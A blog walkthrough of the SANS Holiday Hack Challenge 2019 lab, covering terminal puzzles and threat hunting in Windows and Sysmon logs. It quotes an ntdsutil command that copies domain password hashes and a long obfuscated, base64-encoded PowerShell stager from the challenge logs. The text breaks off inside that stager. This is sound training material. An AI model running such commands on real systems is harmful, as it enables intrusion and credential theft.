<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="SANS Holiday Hack Challenge 2019" /><meta property="og:locale" content="en" /><meta name="description" content="Walkthroughs and research as seen through the eyes of a new pentester." /><meta property="og:description" content="Walkthroughs and research as seen through the eyes of a new pentester." /><link rel="canonical" href="https://megawattsec.com/posts/SANS-Holiday-Hack-Challenge-2019/" /><meta property="og:url" content="https://megawattsec.com/posts/SANS-Holiday-Hack-Challenge-2019/" /><meta property="og:site_name" content="MegaWattSec" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-01-17T20:14:59-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="SANS Holiday Hack Challenge 2019" /><meta name="twitter:site" content="@megawattsec" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2020-01-17T20:14:59-05:00","datePublished":"2020-01-17T20:14:59-05:00","description":"Walkthroughs and research as seen through the eyes of a new pentester.","headline":"SANS Holiday Hack Challenge 2019","mainEntityOfPage":{"@type":"WebPage","@id":"https://megawattsec.com/posts/SANS-Holiday-Hack-Challenge-2019/"},"url":"https://megawattsec.com/posts/SANS-Holiday-Hack-Challenge-2019/"}</script><title>SANS Holiday Hack Challenge 2019 | MegaWattSec</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="MegaWattSec"><meta name="application-name" content="MegaWattSec"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/jamack_close.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">MegaWattSec</a></div><div class="site-subtitle font-italic">Adventures of a Forever-Newb</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/megawattsec" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/megawattsec" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['megawattsec','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>SANS Holiday Hack Challenge 2019</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>SANS Holiday Hack Challenge 2019</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/megawattsec">Dustin</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1579310099" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2020-01-17 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="12502 words"> <em>69 min</em> read</span></div></div></div><div class="post-content"><p><a href="/assets/img/2020/01/ElfUniversity.png"><img data-src="/assets/img/2020/01/ElfUniversity.png" data-proofer-ignore></a></p><h2 id="introduction"><span class="mr-2">Introduction</span><a href="#introduction" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Kringle Con begins with you getting off a train at Elf University, the premier institution of higher learning in the ultra far north.</p><p>Sure was crowded the first day. <a href="/assets/img/2019/12/Train-Station.png"><img data-src="/assets/img/2019/12/Train-Station-1024x502.png" data-proofer-ignore></a></p><p><a href="/assets/img/2019/12/Goofy-Face.png"><img data-src="/assets/img/2019/12/Goofy-Face.png" align="center" data-proofer-ignore></a></p><p>Santa will tell you about how this year’s KringleCon is at Elf University because of how there were just so many people last year that his castle was a little cramped.</p><blockquote class="wp-block-quote"><p> Welcome to the North Pole and KringleCon 2!<br />Last year, KringleCon hosted over 17,500 attendees and my castle got a little crowded.<br />We moved the event to Elf University (Elf U for short), the North Pole’s largest venue.<br />Please feel free to explore, watch talks, and enjoy the con!</p></blockquote><p>There isn’t much in the train station to explore. However, you’ll see the first elf, Bushy Evergreen and his terminal challenge. Also a nice Christmas tree and the train you presumably arrived on.</p><p>To find out the objectives of the game, click on your badge icon to open the Badge. All of the game details are there, including the main storyline, hints the elves give, and talks that can help teach the skills needed to solve objectives.</p><h2 id="objective-0"><span class="mr-2">Objective 0</span><a href="#objective-0" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Looking at the Objectives tab of the Badge, you’ll see the first objective. It gives simple instructions to start the game:</p><blockquote class="wp-block-quote"><p> Enter the campus quad and talk to Santa.</p></blockquote><p>The quad is a courtyard in the middle of campus, and in it is Santa with an umbrella. This is what Santa has to say:</p><blockquote class="wp-block-quote"><p> This is a little embarrassing, but I need your help.<br /> Our KringleCon turtle dove mascots are missing!<br /> They probably just wandered off.<br /> Can you please help find them?<br /> To help you search for them and get acquainted with KringleCon, I’ve created some objectives for you. You can see them in your badge.<br /> Where&#8217;s your badge? Oh! It&#8217;s that big, circle emblem on your chest &#8211; give it a tap!<br /> We made them in two flavors &#8211; one for our new guests, and one for those who&#8217;ve attended both KringleCons.<br /> After you find the Turtle Doves and complete objectives 2-5, please come back and let me know.<br /> Not sure where to start? Try hopping around campus and talking to some elves.<br /> If you help my elves with some quicker problems, they&#8217;ll probably remember clues for the objectives.</p></blockquote><p>So you have to complete Objectives 1 – 5 then Santa will give more of the story to progress with.</p><h2 id="objective-1--find-the-turtle-doves"><span class="mr-2">Objective 1 – Find the Turtle Doves</span><a href="#objective-1--find-the-turtle-doves" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>That point is a good time to explore the campus. The turtle doves are in the Student Union area in front of the fireplace.</p><p><img data-src="/assets/img/2020/01/image.png" data-proofer-ignore></p><h2 id="objective-2--unredact-threatening-document"><span class="mr-2">Objective 2 – Unredact Threatening Document</span><a href="#objective-2--unredact-threatening-document" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><blockquote><p>Someone sent a threatening letter to Elf University. What is the first word in ALL CAPS in the subject line of the letter? Please find the letter in the Quad.</p></blockquote><blockquote class="wp-block-quote is-style-large"><p> Answer: DEMAND</p></blockquote><p>The letter is laying on the ground in the corner of the Quad left of the Student Union.</p><p><img data-src="/assets/img/2020/01/image-1.png" data-proofer-ignore></p><p>Clicking the letter downloads a PDF, and within it most of the text is obstructed by red redaction blocks.</p><p><a href="/assets/img/2020/01/image-2.png"><img data-src="/assets/img/2020/01/image-2-1024x957.png" data-proofer-ignore></a></p><p>The objective is to find a way to read the redacted text. All you have to do is select the text with your mouse or keyboard. I used Ctrl-A to select all the text and Ctrl-C to copy it. Then paste it into a text editor, like notepad, to read what the letter says and get the answer. The answer is “DEMAND”.</p><p><a href="/assets/img/2020/01/image-3.png"><img data-src="/assets/img/2020/01/image-3-1024x669.png" data-proofer-ignore></a></p><h2 id="objective-3--windows-log-analysis-evaluate-attack-outcome"><span class="mr-2">Objective 3 – Windows Log Analysis: Evaluate Attack Outcome</span><a href="#objective-3--windows-log-analysis-evaluate-attack-outcome" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><blockquote><p>We’re seeing attacks against the Elf U domain! Using <a href="https://downloads.elfu.org/Security.evtx.zip">the event log data</a>, identify the user account that the attacker compromised using a password spray attack. <em>Bushy Evergreen is hanging out in the train station and may be able to help you out.</em></p></blockquote><blockquote class="wp-block-quote is-style-large"><p> Answer: supatree</p></blockquote><p>This objective has a hint from an elf named Bushy Evergreen. Find him on the right side of the train station platform beside a Christmas tree.</p><p><img data-src="/assets/img/2020/01/image-4.png" data-proofer-ignore></p><h3 id="terminal-challenge--escape-ed"><span class="mr-2">Terminal Challenge – Escape Ed</span><a href="#terminal-challenge--escape-ed" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>He will ask for help with his terminal challenge, where he needs to break out of the “ed” program.</p><blockquote class="wp-block-quote"><p> Hi, I&#8217;m Bushy Evergreen. Welcome to Elf U!<br /> I&#8217;m glad you&#8217;re here. I&#8217;m the target of a terrible trick.<br /> Pepper Minstix is at it again, sticking me in a text editor.<br /> Pepper is forcing me to learn ed.<br /> Even the hint is ugly. Why can&#8217;t I just use Gedit?<br /> Please help me just quit the grinchy thing.</p></blockquote><p>The banner text for the terminal is:</p><figure class="highlight"><pre><code class="language-plain_text" data-lang="plain_text">Oh, many UNIX tools grow old, but this one's showing gray. That Pepper LOLs and rolls her eyes, sends mocking looks my way. I need to exit, run - get out! - and celebrate the yule. Your challenge is to help this elf escape this blasted tool. 
-Bushy Evergreen 
Exit ed. 
1100 </code></pre></figure><p>To solve it, just type “q” for quit.</p><p>Clicking on Bushy Evergreen after solving his challenge will give you the hint.</p><blockquote class="wp-block-quote"><p> Wow, that was much easier than I&#8217;d thought.<br /> Maybe I don&#8217;t need a clunky GUI after all!<br /> Have you taken a look at the password spray attack artifacts?<br /> I&#8217;ll bet that DeepBlueCLI tool is helpful.<br /> You can check it out on GitHub.<br /> It was written by that Eric Conrad.<br /> He lives in Maine &#8211; not too far from here!</p></blockquote><p>Looking at the Hints tab in the badge will show two hints for Bushy Evergreen:</p><ol><li><a href="https://github.com/sans-blue-team/DeepBlueCLI">Github page for DeepBlueCLI</a><li><a href="https://www.ericconrad.com/2016/09/deepbluecli-powershell-module-for-hunt.html">Eric Conrad on DeepBlueCLI</a></ol><h3 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Clicking on the link in the objective description will download a file, Security.evtx.</p><p><strong>EVTX files</strong> are Microsoft Event Viewer logs that can be viewed using Event Viewer. Bushy Evergreen’s hints on DeepBlueCLI will provide a very useful tool for reading these files without having to use Windows Event Viewer.</p><p>Look for failed logon attempts since this was said to be a password spray attack. Password spray attacks take the same list of passwords and use them against every account hoping one will be valid. Knowing that you can deduce that the compromised account will show a different number of attempts since one of them actually worked.</p><ol><li>Download DeepBlueCLI from their Github page and place “Security.evtx” in the same directory.<li>Run DeepBlueCLI against the event log with “.\DeepBlue.ps1 .\Security.evtx” (it takes a couple minutes to process)<li>Find the logon attempts and count how many there are for each account.<li>The compromised account should have a different number of attempts.</ol><p>There were many accounts attempted and they have the same number of attempts, 77. We were told there was only one compromised account and you’ll see there is only one account with an attempt count of 76, and that’s “<strong>supatree</strong>“.</p><p><a href="/assets/img/2020/01/image-5.png"><img data-src="/assets/img/2020/01/image-5-1024x701.png" data-proofer-ignore></a></p><h2 id="objective-4--windows-log-analysis-determine-attacker-technique"><span class="mr-2">Objective 4 – Windows Log Analysis: Determine Attacker Technique</span><a href="#objective-4--windows-log-analysis-determine-attacker-technique" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><blockquote><p>Using <a href="https://downloads.elfu.org/sysmon-data.json.zip">these normalized Sysmon logs</a>, identify the tool the attacker used to retrieve domain password hashes from the lsass.exe process. _For hints on achieving this objective, please visit Hermey Hall and talk with SugarPlum Mary.</p></blockquote><blockquote class="wp-block-quote is-style-large"><p> Answer: ntdsutil.exe</p></blockquote><p>This Objective is to analyze a logfile from Sysmon in order to identify the tool used to get credentials from the “lsass.exe” process, which is the windows local security subsystem.</p><p>You can get a hint on how to analyze Sysmon files from SugarPlum Mary. He is in Hermey Hall which is located on the left side of the Quad.</p><p><a href="/assets/img/2020/01/image-6.png"><img data-src="/assets/img/2020/01/image-6.png" data-proofer-ignore></a></p><blockquote class="wp-block-quote"><p> Oh me oh my &#8211; I need some help!<br /> I need to review some files in my Linux terminal, but I can&#8217;t get a file listing.<br /> I know the command is ls, but it&#8217;s really acting up.<br /> Do you think you could help me out? As you work on this, think about these questions:</p><p> 1. Do the words in green have special significance?</p><p> 2. How can I find a file with a specific name?</p><p> 3. What happens if there are multiple executables with the same name in my $PATH?</p></blockquote><h3 id="terminal-challenge--linux-path"><span class="mr-2">Terminal Challenge – Linux Path</span><a href="#terminal-challenge--linux-path" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>SugarPlum Mary’s Terminal Challenge is “Linux Path” and it’s about finding and running the correct “ls” program.</p><pre class="wp-block-preformatted">I need to list <strong>file</strong>s in my <strong>home/</strong>
To check on project logos
But what I see with <strong>ls</strong> there,
Are quotes from desert hobos...

<strong>which</strong> piece of my command does fail?
I surely cannot <strong>find</strong> it.
Make straight my <strong>path</strong> and <strong>locate</strong> that-
I'll praise your skill and sharp wit!

Get a listing (ls) of your current directory.</pre><p>The words above in bold are subtle hints to solving this challenge. The problem is that “ls” has been replaced by a different file somewhere on the PATH. You can use several of the hinted programs to figure out where the “ls” binary is at and run it.</p><p>To show WHICH “ls” you are currently running:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>~$ which ls
/usr/local/bin/ls
</pre></table></code></div></div><p>To discover all the “ls” files on the current PATH, use “whereis”:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>~$ whereis ls
ls: /bin/ls /usr/local/bin/ls /usr/share/man/man1/ls.1.gz
</pre></table></code></div></div><p>WHEREIS wasn’t one of the hints given in the banner text, but it’s the best suited for this problem.</p><blockquote class="wp-block-quote"><p> Afterward, SugarPlum Mary gives his hint:<br />Oh there they are! Now I can delete them. Thanks!<br />Have you tried the Sysmon and EQL challenge?<br />If you aren&#8217;t familiar with Sysmon, Carlos Perez has some great info about it.<br />Haven&#8217;t heard of the Event Query Language?<br />Check out some of&nbsp;<a href="https://www.endgame.com/our-experts/ross-wolf">Ross Wolf</a>&#8216;s work on EQL or that blog post by Josh Wright in your badge.</p></blockquote><p>His Hints in the Badge:</p><ol><li>Green words matter, files must be found, and the terminal’s $PATH matters.<li><a href="https://pen-testing.sans.org/blog/2019/12/10/eql-threat-hunting/">EQL Threat Hunting</a></ol><h3 id="solution-1"><span class="mr-2">Solution</span><a href="#solution-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>The first hint was for the Terminal Challenge, and the EQL Threat Hunting link goes to a blog post teaching how to use Event Query Language for analyze Windows Event and Sysmon log files.</p><p>In the blog post there is a line <em>“An attacker with privileged access to a Windows Domain Controller can use <code class="language-plaintext highlighter-rouge">ntdsutil</code> to create an accessible backup of the domain password hashes.”</em> which describes exactly what you’re looking for. You could just take <em>ntdsutil</em> from the blog post and put it in the Objective Answer Box to solve the challenge.</p><p>Or you can follow the execution through the log. Start with:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>eql query -f sysmon-data.json 'process where parent_process_name == "lsass.exe"' | jq
</pre></table></code></div></div><p>Those results will show a “cmd.exe” process created. Find what commands were entered by using the process id (PID) for “cmd.exe” and searching against the parent process id (PPID).</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>ᐅ eql query -f sysmon-data.json 'process where ppid == 3440' | jq
{
  "command_line": "ntdsutil.exe  \"ac i ntds\" ifm \"create full c:\\hive\" q q",
  "event_type": "process",
  "logon_id": 999,
  "parent_process_name": "cmd.exe",
  "parent_process_path": "C:\\Windows\\System32\\cmd.exe",
  "pid": 3556,
  "ppid": 3440,
  "process_name": "ntdsutil.exe",
  "process_path": "C:\\Windows\\System32\\ntdsutil.exe",
  "subtype": "create",
  "timestamp": 132186398470300000,
  "unique_pid": "{7431d376-dee7-5dd3-0000-0010f0c44f00}",
  "unique_ppid": "{7431d376-dedb-5dd3-0000-001027be4f00}",
  "user": "NT AUTHORITY\\SYSTEM",
  "user_domain": "NT AUTHORITY",
  "user_name": "SYSTEM"
}
</pre></table></code></div></div><p>You’ll see the same output that’s in the blog post, “<strong>ntdsutil.exe</strong>“. And that is the answer to the Objective.</p><h3 id="rabbit-hole--powershell-reversing"><span class="mr-2">Rabbit Hole – Powershell Reversing</span><a href="#rabbit-hole--powershell-reversing" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Instead of searching by Parent Process ID, I first searched for “cmd.exe” against the “parent_process_name” field. Which gave a lot of results, including some powershell exploits.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>{
"command_line": "powershell.exe  -nop -w hidden -noni -c \"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$en&lt;br&gt;v:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.&lt;br&gt;FileName=$b;$s.Arguments='-noni -nop -w hidden -c &amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAKne&lt;br&gt;010CA7VWbW/aSBD+nEj5D1aFhK0QjANtmkiVbs2bITiBGMxb0Wljr83C2gZ7DZhe//uNAaepmt61J52Vl/XuzOzMM8/M2Il9i9PAF2JdaQhfLs7PujjEn&lt;br&gt;iDmaOVDQcjtzYRz6ewMDnKb7W74KHwSxClarWqBh6k/u7urxmFIfH58LzYJR1FEvGdGSSRKwl/CcE5CcvX4vCAWF74IuT+LTRY8Y3YSS6rYmhPhCvl2et&lt;br&gt;YJLJz6UzRWjHIx//lzXppeKbNifR1jFol5I4k48Yo2Y3lJ+CqlF/aTFRHzOrXCIAocXhxSv3xdHPgRdsgDWNsQnfB5YEd5CcKAn5DwOPSFY0CpheO5mId&lt;br&gt;lNwwsZNshiaJ8QZimtqez2R/i9HTxU+xz6pFiy+ckDFYGCTfUIlFRw77NyBNxZqBl8JD67kySQGwTLImY82PGCsLvmBEfyDaD7VeVxNdKINXloVSAXL4V&lt;br&gt;qB7YMSNH1fwbnqYEkOB5IQGA9/Xi/OLcySjjd25fMwZWZ9PDmoB7YjeI6EHsk1AqCDrcg3kQJvCa64cxkWYv4Aq5Zd2ghZ/rK5kwiHqm/ecA9qZmQO0Z6&lt;br&gt;Jxymks26e7PmVkjDvVJLfGxR62MfOJbKBOHkUOExUzsAXwS86cDYtcIIy7mKWxpsn9Qq3uUv+iqMWU2CZEFmYrAK0ii9L0zx0yI+ZavEw8gOr4D+3IOUJ&lt;br&gt;5k0ieaJ9nt6TsI5asMR1FB6MZQc1ZBMAhmxC4IyI/o6QjFPDgs89/c1WPGqYUjnpmbSUcUT7dVAz/iYWxBziDyvrEiFsUsBaIgaNQmamJQN7s1/yYMVcw&lt;br&gt;YlAFY2kAaYCcN3+ApE0Jw8JB1qWgQ3vJWjHggcyj9BsMuFPqJ7AfqYJfY+e/9y5h8pG2KQwbAK+8guQYLeEEwacihf6SYHgj0325/1TrAj2pITlkQs9KY&lt;br&gt;qglPGZ2zrZSMJ0gOAIQcgm+EgafiiHyoHDuE+E5+pFUEz7jlM91Sl1RBW6q0dPgd0HIrqN3Y9+2FJoe13dxBraila91aT9Mqm7ZhVrhRb/H7bovr9dFiY&lt;br&gt;SDtaTDmkxbS+rS0HFf2qzbdGx1kj3fyh72635bU3X7h2s645jjujWM8Ke8btDOs9tTSNe7U6nFnqG7VUiWq063Wo4Pest3gz2OT4YEjuyPlFtNdJ1yYSq&lt;br&gt;DvWwg152Vr33bM5ly3k7FGyUIudWgP9RC6t54Gg6a7cpsRkm/NddVboHUDI4xaqG4m7fdM7Q0aKhrU1R5+DLrly5qsTOx1vTEZ4bbH7KYmK+MRslEo992&lt;br&gt;5cvM491OcsKuu1VQGdSZJQwaZbgVplWu6n6x7TRfVQcb0AoQbdDm4HIHNhz7oDAeKHSDut0aybLqyixxjPsZIBWl1jRpqUE0+dvWubJrXc+V5qczBZzLa&lt;br&gt;fNTb6LJhdWVZvvSe4a+MLH2180fq9mbjakZwj++xuZmUZaW/bTpojS4vVUV95lq93N7AvX35dvDpXcodIE8uqHmvaPGzbq7jMJpjBnSBLp1VZyMIG6e+2&lt;br&gt;w1oqiGKh5G9JKFPGMw7mIgZzRFjgZU2/rRDw8w5ToJ0MA1gWb5+cyUJL4LSt3GQbd3dTcBJKBvbKnaI7/J5obQrl0rQ2ku7Sgki/PWwqsEqEcFQIR0MKS&lt;br&gt;hHs+xgVkrrKMe0yej/hepUvXP4Z/8LVN/2/uH0l+ArFQ7h/rD7/cZvgfnbgQ8x5SBpQPth5Dj53oz/xIpXXwZpUiDrzulJP+4eY371AB8MF+d/A60hbvx&lt;br&gt;JCgAA''))),System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.Redirec&lt;br&gt;tStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=System.Diagnostics.Process]::Start($s);\"",
"event_type": "process",
"logon_id": 999,
"parent_process_name": "cmd.exe",
"parent_process_path": "C:\\Windows\\System32\\cmd.exe",
"pid": 3824,&lt;br&gt;  "ppid": 3768,
"process_name": "powershell.exe",
"process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
"subtype": "create",
"timestamp": 132186397859599980,
"unique_pid": "{7431d376-dea9-5dd3-0000-00108f774f00}",
"unique_ppid": "{7431d376-dea9-5dd3-0000-001024764f00}",
"user": "NT AUTHORITY\\SYSTEM",
"user_domain": "NT AUTHORITY",
"user_name": "SYSTEM"
}
</pre></table></code></div></div><p>Taking the powershell code and formatting it nicely gives:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>if ([IntPtr]::Size - eq 4) {
    $b = 'powershell.exe'
} else {
    $b = $env: windir + '\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'
};
$s = New - Object System.Diagnostics.ProcessStartInfo;
$s.FileName = $b;
$s.Arguments = '-noni -nop -w hidden -c &amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(' 'H4sIAKne010CA7VWbW/aSBD+nEj5D1aFhK0QjANtmkiVbs2bITiBGMxb0Wljr83C2gZ7DZhe//uNAaepmt61J52Vl/XuzOzMM8/M2Il9i9PAF2JdaQhfLs7PujjEniDmaOVDQcjtzYRz6ewMDnKb7W74KHwSxClarWqBh6k/u7urxmFIfH58LzYJR1FEvGdGSSRKwl/CcE5CcvX4vCAWF74IuT+LTRY8Y3YSS6rYmhPhCvl2etYJLJz6UzRWjHIx//lzXppeKbNifR1jFol5I4k48Yo2Y3lJ+CqlF/aTFRHzOrXCIAocXhxSv3xdHPgRdsgDWNsQnfB5YEd5CcKAn5DwOPSFY0CpheO5mIdlNwwsZNshiaJ8QZimtqez2R/i9HTxU+xz6pFiy+ckDFYGCTfUIlFRw77NyBNxZqBl8JD67kySQGwTLImY82PGCsLvmBEfyDaD7VeVxNdKINXloVSAXL4VqB7YMSNH1fwbnqYEkOB5IQGA9/Xi/OLcySjjd25fMwZWZ9PDmoB7YjeI6EHsk1AqCDrcg3kQJvCa64cxkWYv4Aq5Zd2ghZ/rK5kwiHqm/ecA9qZmQO0Z6Jxymks26e7PmVkjDvVJLfGxR62MfOJbKBOHkUOExUzsAXwS86cDYtcIIy7mKWxpsn9Qq3uUv+iqMWU2CZEFmYrAK0ii9L0zx0yI+ZavEw8gOr4D+3IOUJ5k0ieaJ9nt6TsI5asMR1FB6MZQc1ZBMAhmxC4IyI/o6QjFPDgs89/c1WPGqYUjnpmbSUcUT7dVAz/iYWxBziDyvrEiFsUsBaIgaNQmamJQN7s1/yYMVcwYlAFY2kAaYCcN3+ApE0Jw8JB1qWgQ3vJWjHggcyj9BsMuFPqJ7AfqYJfY+e/9y5h8pG2KQwbAK+8guQYLeEEwacihf6SYHgj0325/1TrAj2pITlkQs9KYqglPGZ2zrZSMJ0gOAIQcgm+EgafiiHyoHDuE+E5+pFUEz7jlM91Sl1RBW6q0dPgd0HIrqN3Y9+2FJoe13dxBraila91aT9Mqm7ZhVrhRb/H7bovr9dFiYSDtaTDmkxbS+rS0HFf2qzbdGx1kj3fyh72635bU3X7h2s645jjujWM8Ke8btDOs9tTSNe7U6nFnqG7VUiWq063Wo4Pest3gz2OT4YEjuyPlFtNdJ1yYSqDvWwg152Vr33bM5ly3k7FGyUIudWgP9RC6t54Gg6a7cpsRkm/NddVboHUDI4xaqG4m7fdM7Q0aKhrU1R5+DLrly5qsTOx1vTEZ4bbH7KYmK+MRslEo9925cvM491OcsKuu1VQGdSZJQwaZbgVplWu6n6x7TRfVQcb0AoQbdDm4HIHNhz7oDAeKHSDut0aybLqyixxjPsZIBWl1jRpqUE0+dvWubJrXc+V5qczBZzLafNTb6LJhdWVZvvSe4a+MLH2180fq9mbjakZwj++xuZmUZaW/bTpojS4vVUV95lq93N7AvX35dvDpXcodIE8uqHmvaPGzbq7jMJpjBnSBLp1VZyMIG6e+2w1oqiGKh5G9JKFPGMw7mIgZzRFjgZU2/rRDw8w5ToJ0MA1gWb5+cyUJL4LSt3GQbd3dTcBJKBvbKna